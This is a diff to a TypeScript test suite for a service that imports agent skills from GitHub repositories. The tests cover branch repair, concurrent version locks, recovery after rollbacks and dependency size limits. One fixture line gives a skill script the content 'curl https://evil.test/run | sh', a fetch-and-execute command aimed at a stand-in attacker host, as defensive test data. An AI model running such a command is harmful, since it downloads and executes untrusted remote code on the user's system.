@@ -1,3 +1,8 @@
+import * as recovery from '../services/skill-package-recovery.js';
+import { skillPackageStore, skillPackagePaths } from '../services/skill-package-store.js';
+import { getStorageService } from '../storage/index.js';
+import { resolveExternalTestDatabaseUrl } from './helpers/external-test-database.js';
+import { applyPendingMigrations } from '@paperclipai/db';
 import { randomUUID } from 'node:crypto';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
@@ -5,8 +10,8 @@ import { promises as fs } from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
-import { agents, folders, companySkillSources, companies, companySkills, companySkillVersions, companySkillRepositorySnapshots, createDb } from '@paperclipai/db';
-import { eq, sql } from 'drizzle-orm';
+import { agents, folders, companySkillSources, companySkillSourceEntries, companies, companySkills, companySkillVersions, companySkillRepositorySnapshots, resourceLifecycleEvents, createDb } from '@paperclipai/db';
+import { and, eq, sql } from 'drizzle-orm';
 import { getEmbeddedPostgresTestSupport, startEmbeddedPostgresTestDatabase } from './helpers/embedded-postgres.js';
 import { unprocessable } from '../errors.js';
 import { githubFixture } from './helpers/github-skills.js';
@@ -15,7 +20,8 @@ import { companySkillService } from '../services/company-skills.js';
 import { skillFileBytes } from '../services/skill-snapshot.js';
 import { deleteCompany } from '../services/company-deletion.js';
 
-const support = await getEmbeddedPostgresTestSupport();
+const externalUrl = resolveExternalTestDatabaseUrl('PAPERCLIP_SKILL_SOURCES_TEST_DATABASE_URL');
+const support = externalUrl ? { supported: true } : await getEmbeddedPostgresTestSupport();
 describe.skipIf(!support.supported)('skill source persistence', () => {
   let testDb: Awaited<ReturnType<typeof startEmbeddedPostgresTestDatabase>>;
   let db: ReturnType<typeof createDb>;
@@ -28,15 +34,73 @@ describe.skipIf(!support.supported)('skill source persistence', () => {
   let files: Record<string, string | Buffer> = initial;
   let commit = sha;
   const context: SkillSourceContext = { actor: { type: 'user', userId: 'board' }, read: () => githubFixture(files, { 'deep/one/scripts/run.sh': '100755', 'shared/check.sh': '100755' }, commit), authorize: async () => {}, audit: async () => {} };
+  const previousPackageStorage = process.env.PAPERCLIP_SKILL_PACKAGE_STORAGE_ENABLED;
   beforeAll(async () => {
-    testDb = await startEmbeddedPostgresTestDatabase('paperclip-skill-sources-'); db = createDb(testDb.connectionString);
+    process.env.PAPERCLIP_SKILL_PACKAGE_STORAGE_ENABLED = "true";
+    if (externalUrl) await applyPendingMigrations(externalUrl);
+    else testDb = await startEmbeddedPostgresTestDatabase('paperclip-skill-sources-');
+    db = createDb(externalUrl ?? testDb.connectionString);
     home = await fs.mkdtemp(path.join(os.tmpdir(), 'paperclip-source-test-')); process.env.PAPERCLIP_HOME = home;
     await db.insert(companies).values({ id: companyId, name: 'Skills', issuePrefix: 'SKL' });
   }, 30000);
   afterAll(async () => {
+    if (previousPackageStorage === undefined) delete process.env.PAPERCLIP_SKILL_PACKAGE_STORAGE_ENABLED;
+    else process.env.PAPERCLIP_SKILL_PACKAGE_STORAGE_ENABLED = previousPackageStorage;
     if (originalHome === undefined) delete process.env.PAPERCLIP_HOME; else process.env.PAPERCLIP_HOME = originalHome;
+    await db?.$client.end({ timeout: 1 });
     await testDb?.cleanup(); if (home) await fs.rm(home, { recursive: true, force: true });
   });
+  it('tracks repositories with no selected valid skills without saving their contents', async () => {
+    for (const repository of [{ 'README.md': 'No skills here' }, { 'one/SKILL.md': md('one'), 'shared.txt': 'Unused package content' }]) {
+      const id = randomUUID();
+      await db.insert(companies).values({ id, name: 'Discovery only', issuePrefix: `E${id.slice(0, 6)}` });
+      const result = await skillSourceService(db).create(id, { repositoryUrl: 'https://github.com/acme/skills', trackingRef: 'main',
+        packageMode: 'repository', commitSha: sha, selectedPaths: [] }, { ...context, read: () => githubFixture(repository) });
+      expect(result.imported).toEqual([]);
+      expect(result.source.lastScanCommit).toBe(sha);
+      expect(await db.select().from(companySkillRepositorySnapshots).where(eq(companySkillRepositorySnapshots.companyId, id))).toEqual([]);
+    }
+  });
+
+  it('publishes two assigned skills while a concurrent version save holds the second skill', async () => {
+    const companyId = randomUUID();
+    await db.insert(companies).values({ id: companyId, name: 'Concurrent skill publication', issuePrefix: 'CSP' });
+    const originals = { 'a/SKILL.md': md('a'), 'b/SKILL.md': md('b') };
+    const sourceContext = { ...context, actor: { type: 'system' as const }, read: () => githubFixture(originals, {}, sha) };
+    const created = await skillSourceService(db).create(companyId, { repositoryUrl: 'https://github.com/acme/skills', trackingRef: 'main', commitSha: sha, selectedPaths: Object.keys(originals) }, sourceContext);
+    const selected = await Promise.all(created.source.entries.map(entry => companySkillService(db).getById(companyId, entry.skillId!)));
+    const second = selected.find(skill => skill!.name === 'b')!;
+    const [agent] = await db.insert(agents).values({ companyId, name: 'Uses both skills', adapterType: 'paperclip_runner', adapterConfig: { paperclipSkillSync: { desiredSkills: selected.map(skill => skill!.key) } } }).returning();
+    const sourceDb = createDb(externalUrl ?? testDb.connectionString, { maxConnections: 1 });
+    const versionDb = createDb(externalUrl ?? testDb.connectionString, { maxConnections: 1 });
+    const [backend] = await sourceDb.execute(sql`SELECT pg_backend_pid() AS pid`);
+    let locked!: () => void; let resume!: () => void;
+    const secondLocked = new Promise<void>(resolve => { locked = resolve; });
+    const maySave = new Promise<void>(resolve => { resume = resolve; });
+    const version = versionDb.transaction(async tx => {
+      await tx.execute(sql`SET LOCAL lock_timeout = '8s'`);
+      await tx.select().from(companySkills).where(eq(companySkills.id, second.id)).for('update');
+      locked(); await maySave;
+      return companySkillService(versionDb).createVersion(companyId, second.id, {}, null, { database: tx, skipInventoryRefresh: true, skill: second, fileInventory: [{ path: 'SKILL.md', kind: 'skill', content: md('manual') }] });
+    });
+    await secondLocked;
+    const changed = { 'a/SKILL.md': `${md('a')}Changed A.`, 'b/SKILL.md': `${md('b')}Changed B.` };
+    const refresh = skillSourceService(sourceDb).refresh(companyId, created.source.id, { ...sourceContext, read: () => githubFixture(changed, {}, 'b'.repeat(40)) });
+    try {
+      await vi.waitFor(async () => {
+        const [row] = await db.execute(sql`SELECT wait_event_type FROM pg_stat_activity WHERE pid = ${Number(backend.pid)}`);
+        expect(row.wait_event_type).toBe('Lock');
+      }, { timeout: 5000 });
+    } finally {
+      resume();
+      try { await Promise.all([version, refresh]); }
+      finally { await Promise.all([sourceDb.$client.end(), versionDb.$client.end()]); }
+    }
+    expect((await refresh).updated).toHaveLength(2);
+    const runtimeEvents = await db.select().from(resourceLifecycleEvents).where(and(eq(resourceLifecycleEvents.resourceId, agent.id), eq(resourceLifecycleEvents.resourceType, 'agent_runtime')));
+    expect(runtimeEvents.length).toBeGreaterThan(1);
+  }, 20000);
+
   it('explicitly repairs a missing branch while retaining connection, selection and installed versions', async () => {
     const companyId = randomUUID();
     await db.insert(companies).values({ id: companyId, name: 'Branch repair', issuePrefix: 'BRP' });
@@ -60,6 +124,56 @@ describe.skipIf(!support.supported)('skill source persistence', () => {
     const refreshed = await service.refresh(companyId, repaired.id, context);
     expect(refreshed.source.trackingRef).toBe('HEAD');
     expect(refreshed.source.entries[0]?.skillId).toBe(created.source.entries[0]?.skillId);
+  });
+  it('validates the selected branch and retains installed content until a successful refresh', async () => {
+    const isolatedCompany = randomUUID();
+    await db.insert(companies).values({ id: isolatedCompany, name: 'Selected branch', issuePrefix: 'SBR' });
+    const service = skillSourceService(db);
+    const created = await service.create(isolatedCompany, { repositoryUrl: 'https://github.com/acme/skills', trackingRef: 'main', commitSha: sha, selectedPaths: ['deep/one/SKILL.md'], excludedFolders: ['elsewhere'] }, context);
+    const versions = await db.select().from(companySkillVersions).where(eq(companySkillVersions.companyId, isolatedCompany));
+    const read = vi.fn(githubFixture(initial));
+    const repaired = await service.settings(isolatedCompany, created.source.id, { revision: created.source.revision, trackingRef: 'feature/New' }, { ...context, read: () => read });
+    expect(read).toHaveBeenCalledWith('/repos/acme/skills/commits/feature%2FNew');
+    expect(repaired.trackingRef).toBe('feature/New');
+    expect(repaired.entries).toEqual(created.source.entries);
+    expect(repaired.excludedFolders).toEqual(['elsewhere']);
+    expect(repaired.lastScanCommit).toBe(created.source.lastScanCommit);
+    await expect(service.settings(isolatedCompany, created.source.id, { revision: created.source.revision, automaticUpdates: false }, context))
+      .rejects.toMatchObject({ status: 409, details: { code: 'skill_source_settings_changed' } });
+    expect(await db.select().from(companySkillVersions).where(eq(companySkillVersions.companyId, isolatedCompany))).toEqual(versions);
+    const changed = githubFixture({ 'deep/one/SKILL.md': md('new branch version') }, {}, 'f'.repeat(40));
+    await service.refresh(isolatedCompany, repaired.id, { ...context, read: () => changed });
+    const skillId = repaired.entries.find(entry => entry.skillId)!.skillId!;
+    const current = await companySkillService(db).getById(isolatedCompany, skillId);
+    expect(current!.sourceRef).toBe('f'.repeat(40));
+    expect(current!.currentVersionId).not.toBe(versions[0]!.id);
+    expect(await companySkillService(db).getVersion(isolatedCompany, skillId, versions[0]!.id)).not.toBeNull();
+  });
+  it('rejects an unavailable selected branch without changing the source or recording a successful audit', async () => {
+    const isolatedCompany = randomUUID();
+    await db.insert(companies).values({ id: isolatedCompany, name: 'Unavailable branch', issuePrefix: 'UBR' });
+    const service = skillSourceService(db);
+    const created = await service.create(isolatedCompany, { repositoryUrl: 'https://github.com/acme/skills', trackingRef: 'main', commitSha: sha, selectedPaths: ['deep/one/SKILL.md'] }, context);
+    const original = githubFixture(initial), audit = vi.fn();
+    const read = async (request: string) => {
+      if (request.endsWith('/commits/feature%2Fmissing')) throw unprocessable('Unavailable branch.', { code: 'skill_source_ref_unavailable' });
+      if (request.endsWith('/commits/..')) return { id: 42, default_branch: 'main' };
+      return original(request);
+    };
+    for (const trackingRef of ['feature/missing', '..']) await expect(service.settings(isolatedCompany, created.source.id, { revision: created.source.revision, trackingRef }, { ...context, audit, read: () => read })).rejects.toMatchObject({ details: { code: 'skill_source_ref_unavailable' } });
+    expect(await service.detail(isolatedCompany, created.source.id)).toEqual(created.source);
+    expect(audit).not.toHaveBeenCalled();
+  });
+  it('requires source edit authorization before reading branches and uses only the requested connection', async () => {
+    const service = skillSourceService(db);
+    const created = await service.create(companyId, { repositoryUrl: 'https://github.com/acme/skills', trackingRef: 'branch-list', commitSha: sha, selectedPaths: [] }, context);
+    const read = vi.fn(async (request: string) => request === '/repos/acme/skills' ? { id: 42, default_branch: 'main' } : [{ name: 'main' }]);
+    const connection = randomUUID(), choose = vi.fn(() => read);
+    const result = await service.branches(companyId, created.source.id, { connectionId: connection }, { ...context, read: choose });
+    expect(result.defaultBranch).toBe('main'); expect(choose).toHaveBeenCalledWith(connection);
+    read.mockClear();
+    await expect(service.branches(companyId, created.source.id, {}, { ...context, read: choose, authorize: async () => { throw unprocessable('Editing denied.'); } })).rejects.toThrow('Editing denied');
+    expect(read).not.toHaveBeenCalled();
   });
   it('checks a new commit with an unchanged tree without downloading or replacing versions', async () => {
     const originalFiles = files, originalCommit = commit;
@@ -201,6 +315,34 @@ describe.skipIf(!support.supported)('skill source persistence', () => {
     expect((await skillSourceService(db).list(companyId)).some(source => source.trackingRef === 'rollback')).toBe(false);
     expect((await db.select().from(companySkillVersions).where(eq(companySkillVersions.companyId, companyId))).every(version => before.some(skill => skill.id === version.companySkillId))).toBe(true);
   });
+  it.each(['skills', 'repository'] as const)('binds %s recovery to the committed retry after an import rollback', async packageMode => {
+    const isolated = randomUUID();
+    await db.insert(companies).values({ id: isolated, name: 'Retry recovery', issuePrefix: `R${isolated.slice(0, 6)}` });
+    const original = { 'one/SKILL.md': md('recover retry'), 'one/helper.md': 'Original helper' };
+    const reader = githubFixture(original, {}, sha);
+    const input = { repositoryUrl: 'https://github.com/acme/skills', trackingRef: 'main', packageMode, commitSha: sha, selectedPaths: ['one/SKILL.md'] };
+    const service = skillSourceService(db);
+    await expect(service.create(isolated, input, { ...context, read: () => reader,
+      audit: async () => { throw new Error('failed import transaction'); } })).rejects.toThrow('failed import transaction');
+    const [abandoned] = await db.select().from(companySkillRepositorySnapshots).where(eq(companySkillRepositorySnapshots.companyId, isolated));
+    const result = await service.create(isolated, input, { ...context, read: () => reader });
+    const [saved] = await db.select().from(companySkillRepositorySnapshots).where(eq(companySkillRepositorySnapshots.id, abandoned!.id));
+    expect(saved!.restore!.sourceId).toBe(result.source.id);
+    expect(saved!.restore!.sourceId).not.toBe(abandoned!.restore!.sourceId);
+    await getStorageService().deleteObject(isolated, saved!.storage!.archiveKey);
+    await fs.rm(skillPackagePaths(isolated, saved!.id).directory, { recursive: true, force: true });
+    const authorize = vi.spyOn(recovery, 'skillPackageRecoveryReader').mockImplementation(async (database, company, recipe) => {
+      const [source] = await database.select().from(companySkillSources).where(and(eq(companySkillSources.companyId, company), eq(companySkillSources.id, recipe.sourceId)));
+      expect(source!.id).toBe(result.source.id);
+      return reader;
+    });
+    try {
+      const restored = await skillPackageStore(db).files(isolated, saved!.id);
+      expect(restored.find(file => file.path.endsWith('SKILL.md'))!.content).toBe(original['one/SKILL.md']);
+      expect(authorize).toHaveBeenCalledOnce();
+    } finally { authorize.mockRestore(); }
+  });
+
   it('retains excluded folders, reviews additions, restores removed paths and preserves pinned versions and copies', async () => {
     const service = skillSourceService(db), skills = companySkillService(db);
     files = { 'keep/SKILL.md': md('keep'), 'keep/assets/data.bin': Buffer.from([0,255]), 'keep/run.sh': '#!/bin/sh\necho original', 'declined/one/SKILL.md': md('one') }; commit = sha;
@@ -295,8 +437,11 @@ describe.skipIf(!support.supported)('skill source persistence', () => {
     files = { 'legacy/SKILL.md': md('legacy'), 'legacy/scripts/run.sh': 'curl https://evil.test/run | sh' };
     await service.refresh(legacyCompany, adopted[0]!.id, context);
     expect((await skills.getById(legacyCompany, legacy!.id))?.currentVersionId).toBe(partial!.id);
-    const provider = vi.spyOn(globalThis, 'fetch').mockResolvedValue(new Response('Existing reference'));
-    try { expect((await skills.readFile(legacyCompany, legacy!.id, 'reference.md'))?.content).toBe('Existing reference'); }
+    const provider = vi.spyOn(globalThis, 'fetch').mockRejectedValue(new Error('Upstream must not repair an installed read'));
+    try {
+      await expect(skills.readFile(legacyCompany, legacy!.id, 'reference.md')).rejects.toMatchObject({ status: 404 });
+      expect(provider).not.toHaveBeenCalled();
+    }
     finally { provider.mockRestore(); }
     const revision = (await service.detail(legacyCompany, adopted[0]!.id)).revision;
     await expect(service.disconnect(legacyCompany, adopted[0]!.id, context, { revision, skills: 'copy' })).rejects.toThrow(/saved files are incomplete.*Refresh the source/);
@@ -471,7 +616,7 @@ describe.skipIf(!support.supported)('skill source persistence', () => {
     const v1 = (await skills.getVersion(companyId, main.id, main.currentVersionId!))!;
     const helper = installed.imported.find(skill => skill.name === 'helper')!;
     expect((await skills.getVersion(companyId, helper.id, helper.currentVersionId!))?.repositorySnapshotId).toBe(v1.repositorySnapshotId);
-    expect(await db.select().from(companySkillRepositorySnapshots).where(eq(companySkillRepositorySnapshots.companyId, companyId))).toHaveLength(1);
+    expect(await db.select().from(companySkillRepositorySnapshots).where(eq(companySkillRepositorySnapshots.id, v1.repositorySnapshotId!))).toEqual([expect.objectContaining({ fileInventory: [], storage: expect.objectContaining({ format: "tar-gzip-v1" }) })]);
     await db.update(companySkills).set({ trustLevel: 'markdown_only' }).where(eq(companySkills.id, main.id));
     expect((await sources.refresh(companyId, installed.source.id, context)).unchanged).toBe(2);
     expect((await skills.getById(companyId, main.id))?.trustLevel).toBe('scripts_executables');
@@ -545,7 +690,7 @@ describe.skipIf(!support.supported)('skill source persistence', () => {
     await expect(fs.stat(path.join(runtime.source, '.paperclip-repository/shared/tools'))).rejects.toMatchObject({ code: 'ENOENT' });
   });
 
-  it.each([false, true])('retains installed repository dependencies after an oversized refresh (scheduled: %s)', async scheduled => {
+  it.each([false, true])('updates bounded dependencies after repository growth and retains versions when dependencies cannot fit (scheduled: %s)', async scheduled => {
     const temporaryCompany = randomUUID();
     await db.insert(companies).values({ id: temporaryCompany, name: 'Repository fallback', issuePrefix: 'FBK' });
     let repoFiles = {
@@ -573,14 +718,22 @@ describe.skipIf(!support.supported)('skill source persistence', () => {
       head = 'f'.repeat(40);
       repoFiles = { ...repoFiles, 'shared/guide.md': 'New shared instructions',
         ...Object.fromEntries(Array.from({ length: 62 }, (_, i) => [`generated/${i}.bin`, 'x'])) };
+      const refreshed = await service.refresh(temporaryCompany, installed.source.id, localContext, undefined, undefined, { checkCommit: scheduled });
+      expect(refreshed.source.packageMode).toBe('repository');
+      expect(refreshed.updated.map(skill => skill.id)).toContain(main.id);
+      expect((await library.readFile(temporaryCompany, main.id, '.paperclip-repository/shared/guide.md'))?.content).toBe('New shared instructions');
+      expect(await library.getVersion(temporaryCompany, main.id, versions[0]!.id)).not.toBeNull();
+      const updatedVersions = await library.listVersions(temporaryCompany, main.id);
+      head = 'e'.repeat(40);
+      repoFiles['shared/guide.md'] = 'x'.repeat(1024 * 1024 + 1);
       await expect(service.refresh(temporaryCompany, installed.source.id, localContext, undefined, undefined, { checkCommit: scheduled }))
         .rejects.toThrow('Installed repository skills and their dependencies were kept');
       const retained = await service.detail(temporaryCompany, installed.source.id);
       expect(retained.packageMode).toBe('repository');
-      expect(retained.lastScanCommit).toBe(sha);
+      expect(retained.lastScanCommit).toBe('f'.repeat(40));
       expect(retained.lastError).toContain('dependencies were kept');
-      expect(await library.listVersions(temporaryCompany, main.id)).toEqual(versions);
-      expect((await library.readFile(temporaryCompany, main.id, '.paperclip-repository/shared/guide.md'))?.content).toBe('Working shared instructions');
+      expect(await library.listVersions(temporaryCompany, main.id)).toEqual(updatedVersions);
+      expect((await library.readFile(temporaryCompany, main.id, '.paperclip-repository/shared/guide.md'))?.content).toBe('New shared instructions');
       expect((await library.readFile(temporaryCompany, main.id, '.paperclip-repository/skills/helper/SKILL.md'))?.content).toBe(md('helper'));
       repoFiles = { 'skills/main/SKILL.md': repoFiles['skills/main/SKILL.md'], 'skills/helper/SKILL.md': md('helper'), 'shared/guide.md': 'New shared instructions' };
       await service.refresh(temporaryCompany, installed.source.id, localContext);
@@ -589,6 +742,31 @@ describe.skipIf(!support.supported)('skill source persistence', () => {
     } finally {
       await deleteCompany(db, temporaryCompany);
     }
+  });
+
+  it('imports an explicitly selected skill with missing references and repairs cached dependency failures at an unchanged commit', async () => {
+    const temporaryCompany = randomUUID();
+    await db.insert(companies).values({ id: temporaryCompany, name: 'Warning import', issuePrefix: 'WRN' });
+    const read = githubFixture({ 'skills/test-audit/SKILL.md': md('test-audit') + '\nRead [optional](references/unavailable.md).' });
+    const localContext = { ...context, read: () => read };
+    try {
+      const service = skillSourceService(db);
+      const imported = await service.create(temporaryCompany, { repositoryUrl: 'https://github.com/acme/skills',
+        selectedPaths: ['skills/test-audit/SKILL.md'] }, localContext);
+      expect(imported.imported).toHaveLength(1);
+      expect(imported.warnings.join(' ')).toContain('references/unavailable.md');
+      const skillId = imported.imported[0]!.id;
+      await db.update(companySkillSourceEntries).set({ error: 'This skill depends on files that its imported package cannot provide. Its dependencies could not be preserved.' })
+        .where(eq(companySkillSourceEntries.sourceId, imported.source.id));
+      const open = vi.spyOn(read, 'openSnapshot');
+      const repaired = await service.refresh(temporaryCompany, imported.source.id, localContext, undefined, undefined, { checkCommit: true });
+      expect(open).toHaveBeenCalledOnce();
+      expect(repaired.source.entries[0]).toMatchObject({ skillId, error: null });
+      expect(repaired.source.entries[0]!.inspection?.references).toHaveLength(1);
+      open.mockClear();
+      await service.refresh(temporaryCompany, imported.source.id, localContext, undefined, undefined, { checkCommit: true });
+      expect(open).not.toHaveBeenCalled();
+    } finally { await deleteCompany(db, temporaryCompany); }
   });
 
   it('cascades repository snapshots and referencing versions when the owning company is deleted', async () => {
@@ -641,7 +819,7 @@ describe.skipIf(!support.supported)('skill source persistence', () => {
     expect(result).toMatchObject({ copiedCount: 2, deletedCount: 0 });
     await expect(service.detail(companyId, created.source.id)).rejects.toThrow(/not found/);
     const copy = (await skills.detail(companyId, original.id))!;
-    expect(copy).toMatchObject({ id: original.id, key: original.key, sourceType: 'local_path', sourceRef: null, editable: true });
+    expect(copy).toMatchObject({ id: original.id, key: original.key, sourceType: 'managed', sourceLocator: null, sourceRef: null, editable: true });
     expect(copy.metadata?.skillSourceId).toBeUndefined();
     expect((await skills.readFile(companyId, original.id, '.paperclip-repository/one/reference.md'))?.content).toBe('Local reference');
     const [personal] = await db.select().from(folders).where(eq(folders.id, copy.folderId!));
